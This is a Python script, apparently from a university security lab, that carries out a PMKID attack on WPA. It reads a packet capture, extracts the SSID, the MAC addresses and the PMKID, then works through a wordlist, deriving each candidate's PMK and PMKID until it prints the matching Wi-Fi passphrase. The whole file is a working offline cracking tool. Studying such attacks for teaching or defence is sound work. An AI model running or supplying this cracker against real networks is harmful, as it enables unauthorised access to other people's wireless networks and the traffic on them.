#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

__author__      = "Abraham Rubinstein et Yann Lederrey"
__modified__    = "Melissa Gehring, Maxim Golay et Maëlle Vogel"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib

from scapy.contrib.wpa_eapol import WPA_key, EAPOL
from scapy.layers.dot11 import Dot11, Dot11Beacon

# Read capture file
wpa=rdpcap("PMKID_handshake.pcap")

# Important parameters for key derivation - most of them can be obtained from the pcap file
ssid        = wpa[144][Dot11Beacon].info.decode()
APmac       = a2b_hex(wpa[145][Dot11].addr2.replace(':', ''))
Clientmac   = a2b_hex(wpa[145][Dot11].addr1.replace(':', ''))
PMKID       = wpa[145].original[193:209]

print ("\n\nValues used to derivate keys")
print ("============================")
print ("SSID:",ssid,"\n")
print ("AP Mac:",b2a_hex(APmac),"\n")
print ("CLient Mac:",b2a_hex(Clientmac),"\n")
print ("PMKID:", b2a_hex(PMKID),"\n")

# Read passphrases in wordlist.txt
wordlist = open('wordlist.txt', 'r')

for w in wordlist.read().splitlines():
    # Calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
    pmk = pbkdf2(hashlib.sha1, str.encode(w), str.encode(ssid), 4096, 32)

    # Calculate PMKID of the passphrase
    PMID_test = hmac.new(pmk, b"PMK Name" + APmac + Clientmac, hashlib.sha1).digest()[:16]

    # Compare the PMKID found in capture file with the one calculated for the passphrase
    if PMKID == PMID_test:
        print("Found passphrase:", w)
        break
    else:
        print("Passphrase", w, "is not correct")
